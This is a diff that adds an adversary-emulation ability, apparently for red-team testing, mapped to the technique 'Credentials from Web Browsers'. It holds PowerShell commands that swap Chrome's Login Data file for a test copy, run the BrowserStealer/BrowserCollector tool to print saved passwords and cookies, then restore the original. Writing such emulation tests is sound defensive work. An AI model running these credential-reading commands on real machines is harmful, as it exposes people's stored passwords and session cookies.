@@ -1,0 +1,29 @@
+- description: '[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple
+    password/cookies stealer for chrome, edge, and gecko based browsers (30 listed
+    working). This attack simulates stealing the data from the browser files and printing
+    them to the command line.
+
+    If using to test with Firefox, if the browser is x64 you need to use the x64 build
+
+    '
+  id: cf4411185e815ccecbe712b46ae2156e
+  name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
+  platforms:
+    windows:
+      psh:
+        cleanup: Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login
+          Data" > $null; Copy-Item "$env:temp" -Destination "$env:localappdata\Google\Chrome\User
+          Data\Default\Login Data" > $null; Remove-Item "$env:temp\Login Data" > $null
+        command: Copy-Item "$env:localappdata\Google\Chrome\User Data\Default\Login
+          Data" -Destination "$env:temp" > $null; Remove-Item "$env:localappdata\Google\Chrome\User
+          Data\Default\Login Data" > $null; Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\Login
+          Data" -Destination "$env:localappdata\Google\Chrome\User Data\Default\"
+          > $null; cd "$env:PathToAtomicsFolder\T1555.003\bin"; .\BrowserCollector.exe
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
